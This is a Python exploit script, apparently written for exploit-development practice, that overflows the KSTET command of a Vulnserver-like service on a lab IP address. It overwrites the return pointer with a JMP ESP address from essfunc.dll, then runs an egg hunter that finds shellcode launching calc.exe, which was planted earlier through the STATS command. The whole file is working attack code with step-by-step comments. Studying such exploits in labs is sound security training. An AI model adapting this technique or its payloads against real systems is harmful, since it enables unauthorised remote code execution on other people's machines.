#!/usr/bin/python
import socket,sys,struct

RHOST = "192.168.57.144" # Remote IP
RPORT = 9999 # Remote port

buf_totlen = 6000 # Total length of buffer (payload)
offset_srp = 66 # Offset to saved return pointer; the overflow directly overwrites EIP

ptr_jmp_esp = 0x625011AF # Pointer to JMP ESP in essfunc.dll
add_eax_10 = "\x83\xc0\x0a" # Op. code for 'add eax,10'; moves over 'STET /.:/' in EAX
push_eax_ret = "\x50\xc3" # "" 'push eax# ret'; pushes mem. address in EAX to stack; ESP pts. to EAX

# Egg hunter that searches for "w00t" using NtDisplayString
egg_hunter = ""
egg_hunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a"
egg_hunter += "\x43\x58\xcd\x2e\x3c\x05\x5a\x74"
egg_hunter += "\xef\xb8"
egg_hunter += "w00t" # Tag
egg_hunter += "\x8b\xfa\xaf\x75\xea\xaf\x75\xe7"
egg_hunter += "\xff\xe7"

# Payload of calc.exe through WinExec; See WinExec-calc.nasm
egg_calc = ""
egg_calc += "w00tw00t" # Tag x2
egg_calc += "\x90" * 24 # Some padding
egg_calc += "\xeb\x17\x5e\x31\xd2\x52\x88\x56" 
egg_calc += "\x13\x56\xb8\xad\x23\x86\x7c\xff"
egg_calc += "\xd0\x52\xb8\xe8\xc0\x80\x7c\xff"
egg_calc += "\xd0\xe8\xe4\xff\xff\xff\x63\x6d"
egg_calc += "\x64\x2e\x65\x78\x65\x20\x2f\x63"
egg_calc += "\x20\x63\x61\x6c\x63\x2e\x65\x78"
egg_calc += "\x65\x4e"

buf = ""
buf += "\x43" * 12 # First bytes after 'KSTET /.:/'; EAX points to 'STET...'
buf += egg_hunter # Egg hunter shellcode
buf += "\x41" * (offset_srp - len(buf)) # Fills to offset_srp (66) with 'A'
buf += struct.pack("<I", ptr_jmp_esp) # SRP overwrite with memory address of JMP ESP
buf += add_eax_10 # Execution begins here after JMP ESP; adds 10 to EAX; moves past 'STET...'
buf += push_eax_ret # Pushes memory address of EAX to stack, which pts. to controllable buffer; RET
buf += "\x42" * (buf_totlen - len(buf)) # Fills rest of buffer with 'B'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

s.send('STATS ' + egg_calc) # Payload of calc.exe needs to be put into memory via STAT, not KSTET
s.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

s.send("KSTET /.:/" + buf) # Buffer (with the egg hunter) is sent through KSTET
s.close()

